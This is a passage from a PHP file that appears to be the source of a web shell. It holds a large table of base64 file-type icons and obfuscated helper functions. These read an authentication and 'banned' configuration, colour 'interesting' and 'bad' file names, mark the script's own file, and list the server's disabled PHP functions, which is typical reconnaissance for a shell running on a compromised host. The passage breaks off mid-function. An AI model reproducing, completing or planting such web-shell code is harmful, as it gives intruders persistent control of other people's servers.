6+J0Boo4mJYqOJkIiG6YuFeTfXoC1uscBaS+/gMK+uXqLRk0UrRaQeJhwJY6IRfqRWobu6iPT0sGtzL6F9+7HWzguMMaVCodC3/dBhjv79z7KeyVpLoVDAGFMy8Xh8qFwujxSLxd5l0b8mGo2Wk8nk0E8I/36fE9VC/wAAAABJRU5ErkJggg==",
    "mp3" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAGnSURBVDiNpZBPaxNRFMXPjFcSGtrQDiYNUgxKN0LqZ2hApAs/Ql1ZN3Vp6Kbgxp3duPAbFLor0m132XQRKvUZUGegBq2EYBU78wIz789cFyXSOtPQ0gMPHpdzf/fc63Q6nYfGmI00TRdwBbmuK4johdNut0W9Xm9Uq1W4rnup5jRNMRgM0Ov1PpJSquF5HpRSVwkAz/Pg+36DrLWw1mYMYcI4OrH4+lMh6Mf49G0IcRhh79V9AMCoj4wxYOYM4Nn2H8gwQRTGkGECGZ3+z3qNMSCtdS5Ahgnqk4zbtSLmpku4d6uAR+sfznm11iBrbS4gCmO8eTqXqZ/1jl1BhkluPbPChYDomoDRwQ4Oh3i++QPfTwzgOuMBn/sJ1t4dw+/HkFKBmdHaOsIXZwKYcVDNAbgjADPj5c4x3g9v4FexiEptEsyMxw+mMBVK3Ikl3j6p/fMyczbB4t2b2N/9jdmig9fLs2BmrC5VsLpUGX8DrTWICCtNDytNL9f8v4wxpysQkS+EgFLqXLxxTykFIQSIyKdSqdQKgmCj2+3OXzguR4VCISiXy62/DsFP85AcHBcAAAAASUVORK5CYII=",
    "ttf" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAIHSURBVDiNlZJBaBNBFIb/newmxRRT3EqqobhRDCiJB+vBUxHBgxavevLgwbuCBcGexUNPlZ5EpCAIhXiViiJEbQIpttRFya5mkyZE0iSVom3dnTe7HlIDWzdQf5jL+9//DW/mScVi8RIRTbuuewb/IcbYqizLd6VcLreqaVomHo+DMbavsOu6aDabqFQqn2THcTKqqsJxnMBmIVzcf7QAAHh4+3KvrqoqDMPIyEIICCH63rawaKCxvglJAnZsjoGwvAvu5hgRwfO8wLP5cwev8yWcO50A54RqY8PnExEY57wv4PnLZUyMn0JKGwaRQLnW8fmcczAhRGDYqndQqXcwPnYcx44MQQiBcq3t6xFCQP47wl49yRZw4+oYAA+jI13At7WWr5eIggEfli0MHRxASjsMz/MQVkIYUQdh1dsgEgiFWH+AwwlPs4uYuJBGbulrr67IEn7bDqrfN5BMqP0B2VcrODE6jK1tG1vbdq8+eCDcHaPagnb0UDCg/eMX3hZKmJm6hrAS8o318XMNhRULZnUdF8+nggGP59/j+pWzUGT2z7skEyqICIbV7HlE1F2ktUYbN+/N4U3+C+Ze5FGutXzf9W7JxJ0H8xBCQDfquDX1DLbtgIggzc7OlpLJZCqdTkNRlOB93iPOOXRdh2VZhhyNRidN05zWdf3kvtK7ikQiZiwWm/wDf6N/hwnofhAAAAAASUVORK5CYII=",
    "jpg" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAIcSURBVDiNlZJNTlNhGIWf9+v9bi8FqnANjVHToCE6ANbgxGUYN8EiTGQJrsC4AgdOGOgABkCjicVII1qr/LS0vbf9fh1gwszQd36enPOeI7u7u8+MMdsxxk1mOBE5SNN0S3Z2dg6azeZGo9FAKXUjcQiBXq9Hp9M5TIwxG3meY4yZxQB5ntNutzcS5xzv9g95/votsVYhaoVMPTJ2SBmQSUAmEWVALIgXAN68eoFzjsQ5R3cwYPl+E5nXBC1MLwvi0JBahSojYWShDIgVlFeIwFl/zLxyJNZaVK1G404DVdUEAk47wnyAiUcM6GmkPC9JKxlZrYZSglRTbGGvHFSU5unjR3y6GLOgFRdjQ6xFcIJYoWYD7rYnRE1taZEs04j2VxG89yhV4ecQ1u+tcNIfczeZp55ozieRlVRzfDxgablKVCmrj5aIaQLSxXuPcs5BgBgjE+tQUVitz/HroqQYTOn1CvIsJUOhBUZDQ7c3Rny8fqLygcuzEeNRSXCBD51z/NTjho5CKnQLjy0cWX2O3u8qIkK4lV0DEufon5xSSROCD5ixYTIo8YVFoQg2XpV/BhWdXAE2Hl4DqlPLny8/ULpC9AFTTHCl+++QnH1wDWjkdU6/fZ1piSv5Iv3uvxY2nzT5/v7lTIDhcMjn/Y8kSqn23t7e2vr6OlrrG4mttbRaLZRS7WRhYWHr6Ohou9Vqrc3iIMuydr1e3/oLlTAupOJParwAAAAASUVORK5CYII=",
    "css" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAHNSURBVDiNlZK9bhNBFEaPZ2e8axvbImtpgcpCIkIiToOgoqXlAWiQeAAaSB16/AC8Bq/g1lUWV+vGrVG0koOw1zt/FAOJrITE3G6k+c7cc+80ptPpa2PM2Dl3zH+UECKXUn5qTCaTfDgcjrIsQwixV9g5x3K5ZLFYfJd1XY/SNKUYv8f8LAGQ3QOGH77eCknTlKIoRtJai7WWh65EdRsAaFfivb8V8DcnjTF471HO4rdbAJSK7wQAGGOQWmu894jHzxH1BgDfbOH2AGitkdZavPcU0RTNeeggGlCefmN7sQYg7rV58fnNjRqXCll7ifwzA2OXdMwBzW4GQG30jUrGmCuAEGBNUBBRgnQCW9UAyGZ0N0ANXoENLRO1aT1N8VsLQCPeA3D6Q7OqfgHQTxRnasW5DlsZqJjD8Rmri3Du92K+fDzeBVQP1rRVAkCl15TlI6J7CoDSaDa0SO43AdjYGu/9LsBElrUJCs0oRhqoqvBiIgXOSzaboBQruQvQWvOsc8SWKlwgoZclrHXwbqsGWSOm0sE9UeEPGGOQUsoiz/PDt0fvUEpdTejltZldltaaPJ8hpSxkp9M5mc/n49ls9uTfkesVx/G83++f/AbgZRYV7aahUwAAAABJRU5ErkJggg==",
    "html" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAJ/SURBVDiNlZM9b1RXEIafe+65d9d79wP7rr1oMeCAsOTEjpBQKBBJlygSTZQ+HT8B/gUVok2RPp0lJIjSWJFSGCS02aBk14XBCWZtgyzb7OJ7zpmh2NgUTgFTz/vMzDsz0erq6tfe+zsi8jkfEcaYjrX2VrSystKZm5tbarVaGGM+SCwiDAYD1tfX/7BFUSzleU5RFAAo8PDxvzzfGbLx6oDzMzXO5Bl5NeWLS/kxJM9zer3ekg0hEEIA4OXuiJ9/e0atWuaT9ilazSrtqYwgyu9/Dbj/6Dk3v5mnPVXhSGe896gqIsK95afEScKhE2abGQuzk9QnEja29zEmwmO4u/wnzgdUFe89xjmHqvLjw7+RaOzB1fkZUhuTWIOoosBktUR9IsXElp9+7aOqOOcwIYxpG6+GnJup8+Vnp2lkKTY2JLGh8MJgd4iIciavUC4lrG8doKqEELBHI8TGcHV+hnJqMSYiNhE2NjzdeE3hhM23b1BV8lqZYazvRzgCnJ2usb33lkdrW+wNi2O3s1KCicbb8aKMCk/rVOUkYCIxqAhrL/b45ck/PNvaxwfh8oUm31+7SKOSIgKT1ZQkjk4CpuspO7vjNkeHnsdrO7ggBFF8EKrlBBFlNDpkup6eBFxfaHLoHM1qig9Ke6qC84Lzgg8CwN7+kDSG6wvNkwBV5dvLp3mxvcvm1mtmpyu4ILgg7A8LDt6MqJUNN660j/O99+MtOOew1jKZJdz67lMePNmk09+kcOPKaWKYnZrgh6/Ojs/9P7H3Hmut7XU6nfnFxUWSJMHGETeutP/3iVQVAOcc3W4Xa23PZll2u9/v3+l2u5c+7JHHUSqV+o1G4/Y7VN2AN07a1GsAAAAASUVORK5CYII=",
    "txt" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAFMSURBVDiNlZA9isJAFMd/hgcWFhZRJFNoLLZ0a7XfStDLrLfwMAqewEILu6xV0lgpgieYj2SbTdhs4qIPhhmG/+drHI/HD2vtKk3Td14Yz/MiEfls7Ha7KAzDUa/Xw/O8p8hpmnK73Tifz1+itR75vo/W+pUA+L5PHMcjcc7hnHuJDJDzxFpLlmUArNdrut1uAVJKcblcSm+lFMPhEABrLWKMKQQWi0XFKQzDyjvHG2MQ51zxsdlsAIoUSimAwjlPM51OixqlCvP5vLbvYDAo3TneWlsW2O/3JadHu8irVAQmk0nJqS7FvwkOh0OJdL/fAeh0OgAEQQDwOMF4PK7dwd95mGC73VbcrtcrQRDU1ioEjDGICLPZrALq9/sl199kay2eiMRRFKG1Jsuyp47WmiiKEJFYWq3WMkmS1el0entqAT/TbDaTdru9/AbO//fVB3FwJQAAAABJRU5ErkJggg==",
    "cpp" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAGnSURBVDiNlVIxSxxBGH0zfncrd5oDN3AEUhwJZyFcTBPShqC1IvgLhOQPxN42YJFKQjoLsZBUKZIiaRZSLZFkPDHuNmfnFRdOPIw3881Mqj1Z16D3wWvefO/xvceIOI4XmXnTOfcEY4yUUhHRGxFFkWo0Gq16vQ4p5Z3Ezjl0u110Op0D0lq3wjCE1nqcAxCGIZIkaZG1FtbascQAkOmImeG9zz3+Sob4Fl+g22OUSGDuURnLL6ZQmcxHZGZIYwy89yP8OLrE+499BCVgdWEKi88r2P89xNZeP7fnvYcxBmStzV3w+fsA0xWB1ys1ZJ0+uD+Bs4GFcx5C5GMUIpycajydDSCER0Y/fkgACMAVl0UoGDAD2vhCLzcNM0NmBhnqMxIqHcKwG3E/jy+x9/Uc2rjc7o0GKy+rOO0ZbHzoIdq/wKdogLfbfxAf/sWERMGgEGG+WcbGqxnsfDnHu90+yiWBZ3MB1pbu3a2DzGS+GRYyX98bGRhjQES3lnZdzMyQRJQopaC1LnyU/0FrDaUUiCiharW6nqbpZrvdbo5zQRAEaa1WW/8HGgtKKBMv8f4AAAAASUVORK5CYII=",
    "h" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAFkSURBVDiNlZIxbttAEEUfV+OoUKGChVohQAA38hnSuHbnO7iPD5DeB8hBcgKVkd3QQmRQgKHKgNwZSEEuZ3ZSMLIpUwmiD0yxmP2D/+dPtlgszlX1JqV0xhEIIRQi8iWbz+fFdDqdTSYTQgj/RU4psd1u2Ww29xJjnOV5TozxGAHkeU5ZljMxM8zsKDLAjhdUFXffK0oYXA7gB71et1QVaZqmJXWh4L8cV+/3OmiaBjGz/qcE1ICBN072nOETh0HfhuwsvB/gtcMtyFeBCvyjo98UPnSEqh7egSdvFTxB/B6xKyNbZWR3WX8HBxVYq8A+Gx4cmxmhDvjL/k56CngAr/x1Bx46ydTg1k9hb8DJxQk8gifHa38j7N56IMauhepn9eZi9ee4HPzUqVbV67trQVS1zVPkr3kfgqq2FkSkLIqCGOM/r65bMUaKokBEShmNRtfr9fpmuVx+OkbBcDhcj8fj698AUnPo+XFYhgAAAABJRU5ErkJggg==",
    "java" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAIPSURBVDiNlZPPaxNBGIafncxumsa0lqUGxGAUrCKpgiIBrYKCFDz0Us/+BfUi9uJd6KHqQQ/qP+DFiwURepHGg0IO2jTQmoiWYrUpUvs76czsrIfQQNttwRfmMDPv+/B93zBOsVi8aYwZtdae4z8khChJKe87hUKhlM1me9PpNEKIaHPhGfbaUGtvraVWqzE7OzsllVK9vu+jlIoMO6u/8Ra/stVo7Dj3fZ9KpdIrgiAgCALCMNyz2Fii7d0D9MU7iJ+fd9xt54QxJjr8d47E2F10Jo/34QnOyvwejzEGqbVuBnaprfgSdeI63vQY9f6HBOmzsMuntUbsV34YS2APHSFM+YjF6UjPgS1s9t1DfpvA+KcRS9+bVW5t7G1hG7Ct+JdXeDPj6MwldCaPO/cJm+zGm3xNbKGEWFtgffAFQDRAZ/LE5ichUDiNZdTxyxBPoU5eJS4EXnW85Y8EmK4s5tgFvJm3OFYRugmC1FHY+ANBg9WBp61hRgLEeg3rdSDWauC6OPVlwjDG1pUbhInDTdN+gI43Q8hfU6gz/dRzgyBcsBYn2CT5fgRH1VHZPhrnb+8EaK2RUrJ66xGxpR+0f3xOW3UCJ7SETgxCS9jeRZDqxvjZ1gsYY5BSykqpVOrJ5XK4rovt7mFl4HHkv2gNWinK5TJSyopMJpPD1Wp1tFwunzowtUvxeLza2dk5/A8rQ4uu8K0RngAAAABJRU5ErkJggg==",
    "js" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAGZSURBVDiNlZKxa1NRFMZ/93IhlhQjfUKQog2COEWnKDgK3aKj6OBf4OJg/4FOgtl0sLgJWXUXRIgFh1CQZ1xeBoNQIeKg4uJ9557jUKt9pkZz4Gzf9zvnu+e64XC4LiI9VT3HAuW9z0MId9xgMMhbrVa72Wzivf8vs6oynU6ZTCZvQoyxnWUZMcZFFiDLMoqiaIeUEimlhcwA+74gIpjZwgAAEcGXZYmZ/e6v7/Fbq/BpBLvbuKdX8I9a+P4F+Pi6oi3LkpBSqm5gYNFharhXPWz5JOn6Fu7zO6y2Age0h0dQ+wkAlk7hime4mLCzV7ETnQpARPD7gF+thn3f2yCt3yNdvouVDvfkFuw8rmgPBxho9KgCO3302GnSpdtoOI59+zIDmIngdt9iegQ7ugof+rjnD0AFXetg56/NRKgA/Iv7uJcPsc4NrLaMdTehu1m93TyAtrvYxZuw1KgI5/2DICJ79wwBW1mbmTLPLCL4EEKR5zkxxj8e8+8dYyTPc0IIRajX6xvj8bg3Go3O/HPsgarVauNGo7HxAwJPUB9huYnSAAAAAElFTkSuQmCC",
    "py" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAJkSURBVDiNlZO9a1NRHIafe+65uflo2tigKVgxUq0gbUUcREQ3cfALHN0EK66CHVzcXMTJ2X/Af8DJwVYqQqWWNFSbKNaKH63VmCa9yT3n3HscNBeli77z8z783uHnzM3NnTbG3IvjeIL/iBCiIqW86czMzFTK5fJ4qVRCCPFP5TiOWVtbY2VlZVEqpcaLxSJKqQR49PwVzxbf4gqBUhqtFdcunmR071DCFItFarXauIiiiCiKsNZiraXRCpivf+bUkYNk8gUcv4/1AO4/fJww1lp6PWmMwVoLQLPdYW7pHZtByHRllVani47gR6CxTifhejHGILXWWGt58vINs6+/0OxEbHZjgkaTTjdEOR6trqE/FRK+uA64iNEbyPwIWmtE7/zpxVUqGw5LGxEfWoKvyqNFFhUJsukMGbYoFPawM1wgrN5NZiQTgtCg4gyu9PBcS9T4hI/CcyDrhlwafY8XZSBSEDWw1v6a0BNopcBxSPk+pcY8t868YyjXxuouKdcl7wtoLEMUEMdsF6SFxrcWwk0uT7zn0Ege2uugO6DasNUC3QXhEWqPzG+B6AmunjvOfucjO7of2NXXBrOMdbZotjb4sdWioX2+iTKrqowdOrv9guHSILcnLwCgl2Yh0wcyhacjYiNofFcEg1fonzhBxu/fLvgzOs5DLotjArLpAmvNo8TBU/p2H8NN5RM+EWitkVImAnd4klrlAdKzxFZi1AJix3nS6cJfZWMMUkpZq1Qqo2NjY3ieB4DM76P/8J1tT9Qra62pVqtIKWsyl8tN1ev1e9Vq9cA/veLv+L5fHxgYmPoJJsCGQPCg5+wAAAAASUVORK5CYII=",
    "diz" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAD9SURBVDiNzVCrjoRAEKyddIJAIEZgMSc5D34TFF9z+xf7NQgMDoHBzaHAYPmFmZ7hxIXN7oYhh7tOKun0o1JVl77vr8x8d8594kQJIRQRfV3atlVJkqRxHEMI8adn5xyWZcE8z9+ktU6llNBanxEAKSXGcUzJWgtr7alnANj+iJmxruvuUdd1AIA8z3f3zAwyxngJtrlvb4wBWWu9B1mWHRIcWqiq6tGXZem1IDaCdxRF8WJlD8zsV/A881n4HwTeDJqmeRzWdX2cgTEGRPTC/hzingpm/lVARKNSClprb9rv0FpDKQUiGikMw9s0TfdhGD52jXoqCIIpiqLbDyVJHq338QJuAAAAAElFTkSuQmCC",
    "cmd" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAHiSURBVDiNlZK9a1NhFMZ/933P/Qgp6XDFki2LLjZFdKoEWpBY/4Vg/oNSFPuRbiKunaWEqhQRcZdOQrldHKJLkikB6dpF7VAJyfu+1yFfHXsPnOXA+Z3nPDxeq9WqGmMOnHMrZCilVFtEdryzs7N2qVQqLy0toZS60bJzjouLC87PzzsyHA7LcRwzHA6zCCCOY3q9XlmstdRqNZIkyQRYW1tjc3MTZYzJvAyQJAnGGNRoNJoNC4VCJshoNEJZa2eDTqdDo9GgUCjgeQqtNFoLon1E+2gtaKXxvLHZ1trxC9OqP6uzuvqIdrvDfmOfW/FtoiBHFE46yBEGOaIgIgwijDGIMQalNKKFH62f1Gt1tp5v0djfo1gs8vrVGzw8AFJS0jTFOYdL7RzgS4BooVKpsL3zkvJKmaPmO94fHRMFOZgAIMWlbgxw1wCiBRGf448f+PzpC9sv9rj8c4lSQhjk8LyJgul1Z7DXAQCihMfrG/z9fYmI4PshyfdvLCzkZx6tPlgfX7YaM7iaA6obVU6+nvDv1xVq4rxWmvv3HqKUnkV8Kt06y5On1Tng8PAtURRlysBgMKDZbCIi0js9Pb27vLyM7/s3DlC320VEepLP53f7/f5Bt9u9k0VBGIb9xcXF3f+O+N/4FuZWJwAAAABJRU5ErkJggg==",
    "xml" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAHGSURBVDiNlZLPSlthEMV/98t3c4PBXJtbSCEg2RQkNN34DC5cuOgL+BT1LXwAX6R7CegmReE2tHAjKsQ/pCuDBsn3504XMTeNLaUZmMUMZ86cOUzQ6/V2nHOHeZ5/ZIVQSqVa689Bt9tNW61Wp9FooJT6r+E8zxmNRlxfX3/TxphOkiQYY1YRQJIkZFnW0d57vPcrDQPM57RzDhF5pVFABQAEE0NgPXmtUvTm4ZxDWWsRkSLLJ1eou3FRV758R/fvUXdjyidXS1hrLcp7XzSi7iXh+S2+vjZT9WzRP0aYdgNfXyM8vyXqXhZ47z1qfkJ0fEF4NuRxf5s8KiEihP17/NsqPq6QRyUe97cJz4ZExxeICM65hQfB0xQBpBQUnoRfh5jOu4VHpQCBGfaFoFAw2d3Cbm6wfnQKU0cwfkZnP5nOCaaO9aNT7OYGk92tPwlEhMleG9uMUTcPlHtDbKuOr5YREdTNA7YZM9lrF/ilE+bx9OkDgfWIVovtgGvWsK038Bv2rwQAohV5s/ZSSNHjFa4gsNaitV7pE51zMw+01lmaphhjlp7kX2mMIU1TtNaZrlarB4PB4LDf779fRUEURYM4jg9+AY0DZ4cpAUR4AAAAAElFTkSuQmCC",
    "avi" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAJgSURBVDiNlZO9bhtHFIW/mZ2d3RVXJEs1hBMYCQtFhhYp1QgR8g58Cbmy38JurJcI8hCBmq0JxEVAG8gP1KiUREhczp2fFLMJbHe+7WDunHO+M+ri4uJn7/0bpdSLl9/8RdFU6MpS2BJVGgCSeIIT4t4Rdnve/f0tKaXfjTGvzG63e9v3/cnl5SU/Pj+ksBZdlejSoAqdF4RIFE/cC8E5fmifcXV19eLs7Oyt8d6frFYr7u7ueAjvsbWlqPLrSo8LYswq9oIbHB//dKxWK7z3J+r09DSt12vOz8/5mrm+vqbrOtTx8XGazWYAXJ38Q12XaGvRpYbRAiESJRKdYxiEy/fPALi/v0d77+n7HhHhcFJStzXNtKaZTTiYtxzMW5rZhGZaU7c1h5MSEaHve7z3GO89XdcBoKuSorYUTZ1pjBSieMJuP+YREBG6rsN7jxYR1us1IoIqCpQp0KWhqCxle0DZHlBUNlMxBaoo+PSO8d6zXC6z16RIMZFSIsWM7n8KKZFigpQQEZbLZVbgvWez2SAimbUIcXD4pwHZPiLbR/zTQBxcPhOPiLDZbHIGIQQWi0UOe1CgFMSEHi3lIoWcw94RBodIYrFYEELIFm5ubjg6OmL/lLCjdG2Kz4oUfSA6wQ2CiOL29pb5fI5q2zZZa7+qRP+Ncy4r2G63TKdTfltNqJsKbUt0WXzxF7KCYbfnp18eeXh4oGkaTAjhQ1VV32utmR3WuQO1RdsSZcYMRvlhcFRGIXJHVVWklD6YGOPrGOMbpdR3v/7xhLYeXRp0WX6hYKTkHM45Ukoftdav/wWP7nOnXPYUNgAAAABJRU5ErkJggg==",
    "xls" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAGUSURBVDiNjZMxa9tAGIbfyAeOAo1iuFsEJmA56RS62SZLfkTH/IpCO5bQIT8he5f+hC79A7ZXBZo0NhmkRcQKpJAW4/vuvgzNXSTbSXogEJ907/O8J7Tx7Xv6YZLPTsu7PyEAHB8pWGvx2gqCIBVCfNz4fPbj79abVrjbjtFoBHh/qMDML24mIuR5jqIozkVR/g7ftfdxXcxhmaH1DojoVYM4jpFl2YEgY3B7b2AfqcwMZsZwOAQAKKUwm838RqUUut0umBnGGAhDBDJPnV3AYDDwsyRJanRXkYggiAyqZ+YCptOpJ1ctnAEAaK0hjCWvXw1JkqRGrt47g8cKBtZy7SEzYzQa1ehKqZUqRARhjIGpCLiAfr/vZ51Op0ZeCqCawboXn1veoHoGzmA8HvuZlBIAUJYlpJS+ylPAmq/Q6/VWiMtV/gXQ+grOQErpyXEcIwzD1QqaCEFDPGvgyMt0IkIgW9vzm+wnSGtYyz7gpWuxWCBNUwghrsTbvfjLxa/85HJ0sQkAX3X0Xz9Ts9mcRFH06QFIsTx57QMZyQAAAABJRU5ErkJggg==",
    "pl" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAAN1wAADdcBQiibeAAAAsBJREFUOMuV08trXHUUwPHv73fvzJ1H53HlJmPStE2tdtEmXVhfzVSqkNpShCClCykFl26KG/sXdFtw5cKl/hlCDQQVbSjVzlhkZiCTKiZjJzWTed7f79x7uwg0uBDs2R7O5zzgqPX19YsicieO4zO8QGitH7qu+7laW1t7OD8/v1ipVNBa/6/iOI7pdDq02+2aa4xZzOZyDIZDtNZorVGA0hqlFGq/HSpJUEoBkCQJQRDQaDQWdRRFaKWeJ8UKe70uYi3j0ZA/278hJtyHlQKlcBwHx3GIoghXREAptNYYY2g3f6X7+HuOn77MXq/DaHeDbGGKIKhgrWXQ3yHlFTiUzyMiuNZalNaEkwl7vS6FvGXq7AW8NKR0hlL+KGawyZNEYSY9vrz9KUsXr1Bd/gRrLW4URYgxdDp/ED59hCQJo40uM4ePYCd9lNY4Toqdxz+w3XpA9Y1XmTvxNp6XPVhhPB6x0bhPOtzk/i8NHt37juMnXmEmKDCcJISDp7x54RLbm7/jV6aYO3aKYrGIiKBFBGMMg94OX3/1De9evsH1z74At8zdn/7m27v3KB95nQc//4ibzlI5uUy5VMJxnP0biAij0YBWbZ3Fd85z6swSmUyGs0uX2P6rze2bH/H+1Zvkc4fIZLMUij6e55EkyQFgJmOiOOGDD6+Ty+XwPA+lFKN+l/PvnWP28DEKhSJxHBPHMdbafwNpL8Nbyx8j4ycYY0in0ziOgx8cpVAsISJYa7HWIiJEUYRS6gB4eWaOXC5DEgsiwnA4JI5jCqWXOH3uGmKFwWBAq9Xin91dZmdnMWF4ABSLRcplHxH7fHylFL7vMz09TRiG9Pt9tra2WFlZoVar4fv+PuC6bmN1dfXkwsICqVTqPx9IKUW1WqXb7RIEAfV6Hdd1G24+n7/VbDbv1Ov1117knT3Pa5ZKpVvPANPKWvOoFTopAAAAAElFTkSuQmCC",
    "htaccess" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAAN1wAADdcBQiibeAAAAmFJREFUOMuV089LVFEYxvHvvXOuMzU69zZjlpWl+StzjBTLCAoljSL6sQiDVi2CNhFBSdtwFSK1rL+goCBoaQaGJBWTSONUNpOTlZFTQVZq051z7mkhKaQGvvAuz4fnOfAasVisTUrZ7XneNpYxpmnGhRAXjf7+/nhRIFaHOUl4RRMF4V2ISAhtgIGx6GPP88hkMoyNjQ0L13Xr8go8PqeG+DqUxhkboehoFH9TNUbYwTDFokgkEiGZTNYJpRROyUHM9DdGHnzkSSxDVd8kVXsShA9XYbU04LNDCwClFEopTCklPqsEu+Ik5WsqsXwh7kyEuXlXMnFpgFzXbdxUGq31gpVS4mtvb79cWlqKYYcwNzgY76axxhWDmIxMSza++Elo+CXaFpiVxaDn/yWdTmMqpWZFNIGdFUTPlXGg+hOHPD9fzHV0/Zph8JHF7ys95Hp78JQ7l2CuwnwssFq2s6qzmeaaUU6rH4SNzVwzvjGQXEu28zGq7yHay81V+AfQaG1gtuwgcPUIFVXvOaY8HKOG6ypLb6KeyRuvUB/G0Z63FDC7vsYowfPNbHHe0irzyZnl3MqzePO0COPeM/DU/wG0xjy+l+CpKPX+UXbLMJNelqGpDF/iU2Rnsv8HtNZoD8SZVkpOFNNmvSZqOPRt+sn9xgifsy5SSsRfYKnRThDrwj7KC5+z/7uffruQrD2DszIwD+RyOYQQSyJqdT7Bs000uJLS6fUMx2Lo3GwCUwiRjMfjuK67dBWt0X4fth2grLiYrbW1DCcSCCGSIhgMdqRSqe5EIlG5nHP2+/0p27Y7/gDPzYj0H4o5FQAAAABJRU5ErkJggg==",
    );

/* functions */
function z7z($i, $k = '')
{
    global $config;
    $m = array(
        "version",
        "auth",
        "default_vars",
        "banned",
        "use_buffer",
        "visual",
        "reg_interesting",
        "reg_bad");
    if (!@isset($m[$i]))
        return '';
    return ($k != '') ? (@isset($config[$m[$i]][$k]) ? $config[$m[$i]][$k] : '') : (@
        isset($config[$m[$i]]) ? $config[$m[$i]] : '');
}
function z3g($i, $t)
{
    if ($t != 'd' && $t != 'f' && $t != 'l' && $t != 'e')
        return '';
    if ($t == 'l' || $t == 'e')
        $t = 'f';
    $cs = z9q('reg_self');
    $ci = z9q('reg_interesting');
    $cb = z9q('reg_bad');
    if ($t == 'f' && $i == @basename(__file__))
        return (($cs != '') ? ' style="color: ' . $cs . '";' : '');
    foreach (z7z('6', $t) as $r) {
        if (@preg_match('/' . $r . '/i', $i))
            return (($ci != '') ? ' style="color: ' . $ci . '";' : '');
    }
    foreach (z7z('7', $t) as $r) {
        if (@preg_match('/' . $r . '/i', $i))
            return (($cb != '') ? ' style="color: ' . $cb . '";' : '');
    }
}
function z6h()
{
    $i = @ini_get('disable_functions');
    if ($i != '') {
        $f = @array_map('trim', @explode(',', $i));
        @sort($f);
        return $f;
    } else {
        return array();
    }
}
function z9q($i)
{
    global $color_skin;
    $a = z7z('5', $color_skin);
